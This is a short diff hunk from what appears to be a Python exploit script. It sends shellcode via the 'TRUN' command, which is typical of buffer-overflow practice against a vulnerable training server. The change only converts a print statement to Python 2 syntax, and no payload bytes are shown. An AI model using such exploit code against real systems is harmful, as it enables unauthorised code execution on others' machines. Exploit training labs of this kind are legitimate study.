@@ -11,7 +11,7 @@ try:
 	s.send(('TRUN /.:/' + shell_code))
 	s.close()
 except:
-	print("Error connecting to server!")
+	print "Error connecting to server!"
 	sys.exit()
 		
 				
